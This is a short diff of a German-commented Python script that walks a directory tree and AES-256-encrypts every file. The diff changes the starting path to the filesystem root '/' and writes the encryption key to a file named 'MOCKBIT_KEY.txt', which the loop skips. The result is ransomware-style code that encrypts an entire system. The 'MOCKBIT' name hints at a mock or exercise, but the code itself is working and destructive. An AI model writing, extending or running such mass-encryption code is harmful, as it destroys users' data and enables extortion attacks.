@@ -3,8 +3,9 @@ import base64
 from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
 
-# Verzeichnis anpassen!
-START_PATH = "/pfad/zum/verzeichnis"
+# Zielordner anpassen!
+START_PATH = "/"
+KEY_FILENAME = "MOCKBIT_KEY.txt"
 
 def pad(data):
     pad_length = AES.block_size - (len(data) % AES.block_size)
@@ -23,7 +24,7 @@ def find_and_encrypt_all_files(path, key):
     for dirpath, _, files in os.walk(path):
         for name in files:
             file_path = os.path.join(dirpath, name)
-            if name.endswith(".enc"):
+            if name.endswith(".enc") or name == KEY_FILENAME:
                 continue
             try:
                 encrypt_file(file_path, key)
@@ -33,6 +34,11 @@ def find_and_encrypt_all_files(path, key):
 
 if __name__ == "__main__":
     key = get_random_bytes(32)  # AES-256
-    print("Schlüssel (BASE64, SPEICHERN!):", base64.b64encode(key).decode())
+    key_b64 = base64.b64encode(key).decode()
+    # Schlüssel in Datei speichern
+    key_path = os.path.join(START_PATH, KEY_FILENAME)
+    with open(key_path, "w") as f:
+        f.write(key_b64)
+    print(f"Schlüssel wurde in {key_path} gespeichert. Unbedingt sichern!")
     find_and_encrypt_all_files(START_PATH, key)
     print("Fertig.")
